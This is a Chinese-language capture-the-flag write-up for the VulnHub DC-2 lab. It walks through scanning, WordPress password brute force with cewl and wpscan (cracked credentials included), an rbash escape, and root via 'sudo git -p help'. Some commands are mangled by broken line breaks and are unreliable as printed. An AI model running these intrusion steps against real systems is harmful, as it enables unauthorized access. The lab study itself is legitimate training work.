## 前言

*   靶场链接：https://www.vulnhub.com/entry/dc-2,311/

> Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.
> 
> As with the original DC-1, it's designed with beginners in mind.
> 
> Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.
> 
> Just like with DC-1, there are five flags including the final flag.
> 
> And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.
> 
> In short, the only flag that really counts, is the final flag.
> 
> For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.
> 
> I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.

## 攻击过程

### 信息收集

首先使用 arp-scan 扫描内网存活主机：

```

arp-scan --interface=eth0 192.168.43.0/24
```

![](../Images/fa0e723c015e6931a2a773e8a4f9a80c.png)

image-20210505164955572

发现主机 192.168.43.127，使用nmap进一步探测其端口情况：

```

nmap -sC -sV -p- -sT 192.168.43.127
```

![](../Images/0e744fa026b2cfbb9a2f7753e1869c1f.png)

image-20210505165141439

开放了 80、7744 这两个端口，分别运行的 Web 服务（WordPress）和 SSH。

首先访问 80 端口，是个 WordPress 站点，并在主页发现了 flag1：

![](../Images/3465eb5f526353ad5184406c1cb51f89.png)

image-20210505165340193

flag1 提示我们使用 `cewl` 生成字典进行爆破，那我们可以执行以下命令使用 `cewl` 爬取整个网站上的关键字并生成一个字典：

```

cewl http://dc-2/ > wordlists.txt
```

![](../Images/f10cae524b6585fbc9ca942fdbbe0a5c.png)

image-20210505165746116

然后使用 wpscan 枚举以下 WordPress 上面已存在的用户名：

```

wpscan --url http://dc-2/ -e u
```

![](../Images/a3aafafe9dec440f816c8e933a2cea0c.png)

image-20210505170013301

将枚举成功的三个用户写入 username.txt 中，然后使用 wpscan 并配合刚才生成的字典进行爆破：

```

wpscan --url http://dc-2/ -U username.txt -P wordlists.txt
```

![](../Images/d905b02c27793de018c4123d28a491e1.png)

image-20210505170248539

如上图所示，成功爆破得到了 jerry 和 tom 这两个用户的密码：

```
Username: jerry, Password:
 adipiscingUsername: tom, Password:
 parturient
```

使用 jerry 成功登录后台并在后台找到了 flag2：

![](../Images/5bb525623f84d26eaa28505d7d44bf6e.png)

image-20210505170530248

flag2 提示我们如果无法攻克 WordPress 的话可以选择尝试别的方法。

既然目标主机还开了运行着一个 SSH 的 7744 端口，那我们可以尝试使用这两个用户连接 SSH。首先尝试 jerry 失败，使用 tom 成功连接，并在当前目录下发现了 flag3：

![](../Images/f663c06e39d45a7c7612fae289518471.png)

image-20210505171243837

但是像 cat、more等常见的命令都无法执行。我们查看一下环境变量：

```
echo $PATH


```

![](../Images/7e6b6b98609be0e159569bae8665cb68.png)

image-20210505171332620

发现可以执行的也就是这四个命令，可见当前获得的 Shell 是一个 rbash，即严格限制了可执行命令的bash。所以我们要尝试逃逸这个 rbash。

在网上找到了逃逸的方法：

```

BASH_CMDS[a]=/bin/sh;aexport PATH=$PATH
:/bin/export PATH=$PATH
:/usr/bin
```

![](../Images/99a56e1e7645dceade0175999eadf018.png)

image-20210505171604335

如上图所示，成功逃逸。

在 jerry 用户的主目录里发现并读取了 flag4：

![](../Images/5bdf89a63af2f16fd9f0f0eefd7fe3e3.png)

image-20210505171724166

最后一个 flag 应该就是在 /root 目录里了。

### 权限提升

首先尝试 suid 提权，发现没有常见的可利用命令：

```
find / -perm -u=s -type
 f 2>/dev/null
```

![](../Images/1c2283f68bdbd29d5e19b59e01f64d51.png)

image-20210505171947318

然后我们考虑 sudo 提权，查看 tom 用户名有没有可以不需要输入密码即可执行的 root 权限的命令：

```

sudo -l
```

![](../Images/4485ec941a94991bf467fbc81f2beb43.png)

image-20210505172120889

切换到 jerry 用户再查找：

![](../Images/961951f6dff7460ae42dc62896403e9e.png)

image-20210505172222751

如上图所示，发现 jerry 用户名可以无需输入密码直接执行 git 命令。下面我们用这个 git 命令提权：

```
sudo git  -p help


```

![](../Images/80010a1d89d2cccc19e51962656976ab.png)

image-20210505172452217

如上图所示，成功提权。

最后在 /root 目录读取到了最后的 flag：

![](../Images/58c135a19c87817c982becb18f92a14d.png)
